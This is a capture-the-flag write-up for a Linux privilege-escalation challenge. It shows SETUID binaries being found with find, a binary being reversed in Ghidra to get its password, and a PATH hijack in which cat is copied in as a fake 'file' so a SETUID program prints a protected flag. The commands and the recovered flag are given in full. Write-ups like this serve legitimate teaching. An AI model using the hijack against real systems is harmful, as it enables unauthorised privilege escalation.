## Task 2 - Linux flag hunt

### Connecting to the server
This challenge consists of a flag hunting process on a Linux host. As the task description does not specify the server adress, this is our first thing to discover. Besides the *task.txt* file, we are also given 2 additional files, *id_rsa* and *id_rsa.pub*. These represents a **private key** and a **public key** and are mostly used when it comes to authentication, specifically via the SSH protocol.

In general, the private key is provided as an argument to the SSH command while the public key contains details about the server in question. We can view it's content and extract the *user* and *hostname* of the server which holds the actuall challenge.
```bash
──╼ $cat id_rsa.pub 
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDTAXWTpzxpPsyPD9WaWUsWHR8h9ruAJJ7iXsjzmQ6MIss3CXjPRauS8nNLLTczRqhbqoDPHZ+w7NEEEELHXTDin4P8VOVGsi67qR0RGYVTaV/Ow+61pWZ6Y3t8Cw/Ea9PYNhvddySjJWBbR1fR/qeqdHMYr3RLA4zvLXU34Iha2RMeSvnFYbYf+VWtn4UncO2xSOgJrifEpGSK65QgEpgp79xh1tkwD+8o99EmQ498aFYSSpQmoA76OqRPbbl9c5Ev8k2GqSnCyixp6Hua9hvhUlABa4extK2bGqURZe0QU2I/tLdOO5zPxolh1k0HYaYY9RAlCbs0Yr6Z7NAKvSNsKIRw5YUnPaEsl1eHlD0aKvSlieZKQIYx8X8ApWJEU+/sp6AERTfH/jzUvq9d+YLZGpuvfXUvLaOXNJFcQ9YR5QUZGca3718JPW+Pl+tmNyk73uxJonQFnvn+tsBxd5Lk/MxCoI97hzev3b0yRZtD0yMY7DSB3LhvqhltF5yK6Mk= fhunt@isc2021.root.sx
```

Therefore, we can simply connect to **isc2021.root.sx** as user **fhunt** using the following command (set permision to 600 for the private key beforehand):
```bash
─[kayn@parrot]─[~/Documents/ISC/task2]
└──╼ $chmod 600 id_rsa
┌─[kayn@parrot]─[~/Documents/ISC/task2]
└──╼ $ssh -i id_rsa fhunt@isc2021.root.sx
Entering shell (please be patient)...
Note: you have a 20 min timeout to find the flag.
If you need more, you just re-connect and start over (don't worry, the server doesn't re-randomize).

parlit@fhunt:~$ 
```


### Looking for interesting files
From start, we know that we look for a file which holds the flag of the challenge. We can do a **find** command on the system and see if any of the files matches this pattern.
```bash
parlit@fhunt:~$ find / -name '*flag*' -ls 2> /dev/null
   925830      4 -r--------   1 mishelu  root           45 Mar 30 17:45 /usr/games/hunt/manele/oooflagfrumos
   929742      4 -rw-r--r--   1 root     root          814 Mar 16 09:05 /usr/include/linux/kernel-page-flags.h
   935246      8 -rw-r--r--   1 root     root         4161 Mar 16 09:05 /usr/include/linux/tty_flags.h
   935568      8 -rw-r--r--   1 root     root         6021 Mar 16 09:05 /usr/include/x86_64-linux-gnu/asm/processor-flags.h
   935710      4 -rw-r--r--   1 root     root         2140 Jun  5  2020 /usr/include/x86_64-linux-gnu/bits/waitflags.h
   937389      0 lrwxrwxrwx   1 root     root            9 Feb 15  2016 /usr/share/man/man3/fegetexceptflag.3.gz -> fenv.3.gz
   937399      0 lrwxrwxrwx   1 root     root            9 Feb 15  2016 /usr/share/man/man3/fesetexceptflag.3.gz -> fenv.3.gz
    23845      0 -r--r-----   1 root     root         4096 Mar 30 17:46 /sys/devices/platform/serial8250/tty/ttyS15/flags
    23404      0 -r--r-----   1 root     root         4096 Mar 30 17:46 /sys/devices/platform/serial8250/tty/ttyS6/flags
    24237      0 -r--r-----   1 root     root         4096 Mar 30 17:46 /sys/devices/platform/serial8250/tty/ttyS23/flags
    23747      0 -r--r-----   1 root     root         4096 Mar 30 17:46 /sys/devices/platform/serial8250/tty/ttyS13/flags
    24629      0 -r--r-----   1 root     root         4096 Mar 30 17:46 /sys/devices/platform/serial8250/tty/ttyS31/flags
    23306      0 -r--r-----   1 root     root         4096 Mar 30 17:46 /sys/devices/platform/serial8250/tty/ttyS4/flags
    24139      0 -r--r-----   1 root     root         4096 Mar 30 17:46 /sys/devices/platform/serial8250/tty/ttyS21/flags
    23649      0 -r--r-----   1 root     root         4096 Mar 30 17:46 /sys/devices/platform/serial8250/tty/ttyS11/flags
    23208      0 -r--r-----   1 root     root         4096 Mar 30 17:46 /sys/devices/platform/serial8250/tty/ttyS2/flags
    24482      0 -r--r-----   1 root     root         4096 Mar 30 17:46 /sys/devices/platform/serial8250/tty/ttyS28/flags
    23110      0 -r--r-----   1 root     root         4096 Mar 30 17:46 /sys/devices/platform/serial8250/tty/ttyS0/flags
    23992      0 -r--r-----   1 root     root         4096 Mar 30 17:46 /sys/devices/platform/serial8250/tty/ttyS18/flags
    23551      0 -r--r-----   1 root     root         4096 Mar 30 17:46 /sys/devices/platform/serial8250/tty/ttyS9/flags
    24384      0 -r--r-----   1 root     root         4096 Mar 30 17:46 /sys/devices/platform/serial8250/tty/ttyS26/flags
    23894      0 -r--r-----   1 root     root         4096 Mar 30 17:46 /sys/devices/platform/serial8250/tty/ttyS16/flags
    23453      0 -r--r-----   1 root     root         4096 Mar 30 17:46 /sys/devices/platform/serial8250/tty/ttyS7/flags
    24286      0 -r--r-----   1 root     root         4096 Mar 30 17:46 /sys/devices/platform/serial8250/tty/ttyS24/flags
    23796      0 -r--r-----   1 root     root         4096 Mar 30 17:46 /sys/devices/platform/serial8250/tty/ttyS14/flags
    23355      0 -r--r-----   1 root     root         4096 Mar 30 17:46 /sys/devices/platform/serial8250/tty/ttyS5/flags
    24188      0 -r--r-----   1 root     root         4096 Mar 30 17:46 /sys/devices/platform/serial8250/tty/ttyS22/flags
    23698      0 -r--r-----   1 root     root         4096 Mar 30 17:46 /sys/devices/platform/serial8250/tty/ttyS12/flags
    24580      0 -r--r-----   1 root     root         4096 Mar 30 17:46 /sys/devices/platform/serial8250/tty/ttyS30/flags
    23257      0 -r--r-----   1 root     root         4096 Mar 30 17:46 /sys/devices/platform/serial8250/tty/ttyS3/flags
    24090      0 -r--r-----   1 root     root         4096 Mar 30 17:46 /sys/devices/platform/serial8250/tty/ttyS20/flags
    23600      0 -r--r-----   1 root     root         4096 Mar 30 17:46 /sys/devices/platform/serial8250/tty/ttyS10/flags
    24531      0 -r--r-----   1 root     root         4096 Mar 30 17:46 /sys/devices/platform/serial8250/tty/ttyS29/flags
    23159      0 -r--r-----   1 root     root         4096 Mar 30 17:46 /sys/devices/platform/serial8250/tty/ttyS1/flags
    24041      0 -r--r-----   1 root     root         4096 Mar 30 17:46 /sys/devices/platform/serial8250/tty/ttyS19/flags
    24433      0 -r--r-----   1 root     root         4096 Mar 30 17:46 /sys/devices/platform/serial8250/tty/ttyS27/flags
    23943      0 -r--r-----   1 root     root         4096 Mar 30 17:46 /sys/devices/platform/serial8250/tty/ttyS17/flags
    23502      0 -r--r-----   1 root     root         4096 Mar 30 17:46 /sys/devices/platform/serial8250/tty/ttyS8/flags
    24335      0 -r--r-----   1 root     root         4096 Mar 30 17:46 /sys/devices/platform/serial8250/tty/ttyS25/flags
  1489830      0 -rw-r--r--   1 root     root         4096 Mar 30 17:46 /sys/devices/virtual/net/lo/flags
  1488953      0 -rw-r--r--   1 root     root         4096 Mar 30 17:46 /sys/devices/virtual/net/eth0/flags
     2127      0 -rw-r--r--   1 root     root         4096 Mar 30 17:46 /sys/module/scsi_mod/parameters/default_dev_flags
  2300628      0 -rw-r--r--   1 root     root            0 Mar 30 17:46 /proc/sys/kernel/acpi_video_flags
4026532033      0 -r--------   1 root     root            0 Mar 30 17:46 /proc/kpageflags
```

We find the following file that seems to be our flag: **/usr/games/hunt/manele/oooflagfrumos**. However, as we can notice from the permisions, we can not read this file as only user **mishelu** has those permissions.

As the task descriptions mentions about some **hints** placed on the server, we use the previous command to look for any such file.
```bash
parlit@fhunt:/usr/games$ find / -name '*hint*' -ls 2> /dev/null | grep -v proc
   924946      4 -rw-r--r--   1 root     root          202 Mar 26  2020 /usr/lib/tar/gay/hints.txt
```

Therefore, the file at **/usr/lib/tar/gay/hints.txt** seems to be the one mentioned in the task description. Looking at its content, we find some refferences to **ltrace**, **SETUID** binaries.
```bash
parlit@fhunt:/usr/games$ cat /usr/lib/tar/gay/hints.txt
Here's more hints:

  - Gandalf giving you problems, again? try the magic words `ltrace`.
  - What if I told you... that you can escalate privileges on SETUID binaries
    using just one simple trick!
```

The hint refferences to *SETUID* binaries which holds a special type of permissions that allows a normal user to execute a binary as he would have been it's owner. This means that, when the binary is ran by our user **parlit**, it will have its owner permissions. Let's start looking for all *SETUID* binaries and see if any seems uncommon.
```bash
parlit@fhunt:/usr/games$ find / -perm -4000 -ls 2> /dev/null               
   798236     28 -rwsr-xr-x   1 root     root        27608 Jan 27  2020 /bin/umount
   798220     40 -rwsr-xr-x   1 root     root        40128 Mar 26  2019 /bin/su
   798202     40 -rwsr-xr-x   1 root     root        40152 Jan 27  2020 /bin/mount
   925843     12 -rwsr-xr-x   1 mishelu  root         9024 Mar 30 17:45 /usr/lib/tar/gay/nothing.toseehere
   920435     40 -rwsr-xr-x   1 root     root        39904 Mar 26  2019 /usr/bin/newgrp
   920445     56 -rwsr-xr-x   1 root     root        54256 Mar 26  2019 /usr/bin/passwd
   920387     76 -rwsr-xr-x   1 root     root        75304 Mar 26  2019 /usr/bin/gpasswd
   920341     40 -rwsr-xr-x   1 root     root        40432 Mar 26  2019 /usr/bin/chsh
   920339     72 -rwsr-xr-x   1 root     root        71824 Mar 26  2019 /usr/bin/chfn
```

And thus, we have our last piece of the puzzle, located at **/usr/lib/tar/gay/nothing.toseehere**


### Analyzing and understanding the binary
We can quickly see that the *SETUID* binary owner is **mishelu** and thus, our goal is to trick this binary into displaying the content of the flag as, at runtime, it will behave as having *mishelu* permissions.

Firstly, we need to understand what the binary does. By simply running it, we get the following message:
```bash
parlit@fhunt:/usr/games$ /usr/lib/tar/gay/nothing.toseehere
You shall not pass!
```

At this point, we have 2 options. Either download the executable and reverse engineer it using a software such as Ghidra,IDA or Cutter **or**, run some dynamic analysis tools to see it's system calls and deduce its behavior. One such tool is **ltrace** which was also part of the hint.
```bash
parlit@fhunt:/usr/games$ ltrace /usr/lib/tar/gay/nothing.toseehere
__libc_start_main(0x400746, 1, 0x7fffdb630388, 0x400820 <unfinished ...>
puts("You shall not pass!\n"You shall not pass!

)                                                                                                                      = 21
+++ exited (status 1) +++
```
We can only see the *puts* system call. We are left with the option of dissasembling the binary. We can download the file in multiple ways, but the one that we did in the first place was to encode the binary as a base64 payload and copy paste them locally and the decode them.
```bash
parlit@fhunt:~$ base64 /usr/lib/tar/gay/nothing.toseehere
...copy-paste the output locally...
──╼ $base64 -d nothing.toseehere.b64 > nothing.toseehere
┌─[kayn@parrot]─[~/Documents/ISC/task2]
```

We can now load the binary inside Ghidra which is an open source tools that provides us the feature of transforming assembly code into pseudocode. We can browse to *Exports* option and see what the **main** function does.

![[Pasted image 20210330211226.png]]

From the first lines we can see that the program is expecting an argument or otherwise it simply puts *You shall not pass*. This is also the reason why we could not see any other system call, because the program ended instantly if an argument is not given. Looking further, we see that the parameter is taken and compared with a string named **gandalf** and then a **system** command is executed with the following parameter:

![[Pasted image 20210330211531.png]]

Moreover, we can also view the content of the *gandalf* string in order to give the correct argument to the program.

![[Pasted image 20210330211619.png]]

![[Pasted image 20210330211730.png]]

At this point we can go back to the server and execute the binary with the expected parameter of **aeb112a98cb604376880660d0daaa7b9**
```bash
parlit@fhunt:~$ /usr/lib/tar/gay/nothing.toseehere aeb112a98cb604376880660d0daaa7b9
/usr/games/hunt/manele/oooflagfrumos: ASCII text
```


### Exploiting the binary
Now that we have every piece in place, we need to figure out how this can be exploited. We saw in the pseudocode of the binary that it performs the command **file** against our flag. What we want instead, is to **cat** de file so we can get out flag. The catch here is that the command *file* is refferenced with a relative path and thus, it is exploitable using the technique known as [PATH HIJACKING](https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/).

What happens at the OS level is that, when you type any command without its full path, the system looks in the following PATH and checks, from left to right, which folder has an executable with the same name as the command. Using a command such as **which** can also give us information on what the system executes when a command is given.
```bash
parlit@fhunt:~$ echo $PATH
/home/parlit/bin:/home/parlit/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
parlit@fhunt:~$ which ls
/bin/ls
parlit@fhunt:~$ which cat
/bin/cat
parlit@fhunt:~$ which file
/usr/bin/file
```

At this point, the command *file* is equivalent to **/usr/bin/file**. If we modify our PATH such that there is a executable file named *file* before the folder */usr/bin* then we can convince the system to use our own definition of the *file* command. This means that we can create an executable file named *file* which simply does a *cat* on the given argument. This will result in displaying the flag content. Using the following commands we can successfully override what is executed when *file* command is issued.
```bash
parlit@fhunt:~$ echo $PATH
/home/parlit/bin:/home/parlit/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
parlit@fhunt:~$ which file
/usr/bin/file
parlit@fhunt:~$ mkdir /home/parlit/bin
parlit@fhunt:~$ cp /bin/c
cat    chgrp  chmod  chown  cp     
parlit@fhunt:~$ cp /bin/c
cat    chgrp  chmod  chown  cp     
parlit@fhunt:~$ cp /bin/cat /home/parlit/bin/file
parlit@fhunt:~$ chmod +x /home/parlit/bin/file
parlit@fhunt:~$ which file
/home/parlit/bin/file
```

We are left with only executing the binary now and getting the flag content.
```bash
parlit@fhunt:~$ /usr/lib/tar/gay/nothing.toseehere aeb112a98cb604376880660d0daaa7b9
SpeishFlag{45CY8JOLH4Qea4Uzu30JvX7fGU41p8JN}
parlit@fhunt:~$ 
```


### Flag
**SpeishFlag{45CY8JOLH4Qea4Uzu30JvX7fGU41p8JN}**